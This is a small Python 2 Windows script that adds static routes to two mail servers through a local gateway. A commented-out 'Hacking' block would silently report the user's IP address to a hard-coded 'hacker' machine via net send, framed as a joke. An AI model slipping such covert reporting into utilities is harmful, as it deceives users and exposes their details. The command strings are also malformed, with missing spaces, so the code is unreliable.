import os
import time
# IP Address of the Gateway
ip_gateway = ' 192.168.11.1'
ip_hacker  = '192.168.11.153'

# Functions
# -------------------------------->

def get_process_output(cmd):
	process = os.popen(cmd)
	outstr  = process.read()
	return outstr

def set_route():
	# Adding outgoing server route
	print "\nSetting the route for outgoing server...\n"
	cmd = 'nslookup smtpout.secureserver.net'+ ip_gateway +'| findstr "Address: "'
	ret_str = get_process_output(cmd)
	ip_out = ret_str.strip().split("\n")[1].split(":")[1].strip()
	print "Outgoing server IP : " + ip_out + "\n"
	cmd = 'route add ' + ip_out + ip_gateway
	ret_str  = get_process_output(cmd)
	if not ret_str:
		print "Added outgoing server route.\n"
	else: 
		print "Failed to set the outgoing server route!\n"

	# Adding incoming server route
	print "Setting the route for Incoming server...\n"
	cmd = 'nslookup mail.pivotsys.com'+ ip_gateway +'| findstr "Address: "'
	ret_str = get_process_output(cmd)
	ip_in = ret_str.strip().split("\n")[1].split(":")[1].strip()
	print "Incoming server IP : " + ip_in + "\n"
	cmd = 'route add ' + ip_in + ip_gateway
	ret_str  = get_process_output(cmd)
	if not ret_str:
		print "Added incoming server route.\n"
	else: 
		print "Failed to set the incoming server route!\n"
	
	time.sleep(5)

	# Hacking -------------------------------------------------------->	
	# cmd = 'ipconfig | findstr "IP Address"'
	# ret_str = get_process_output(cmd)
	# ip_client = ret_str.split("\n")[1].strip().split(":")[1].strip()
	# print "Your IP is : " + ip_client

	# cmd = 'sc config messenger start ="demand" | sc start messenger | net send %s "Your application was run in the IP: %s"' %(ip_hacker,ip_client) 
	# get_process_output(cmd)
		
	# print "\nThanks for using! You are bugged!! Ha ha.. Juz for fun :-)"

	# ---------------------------------------------------------------->	
		
	#time.sleep(6)

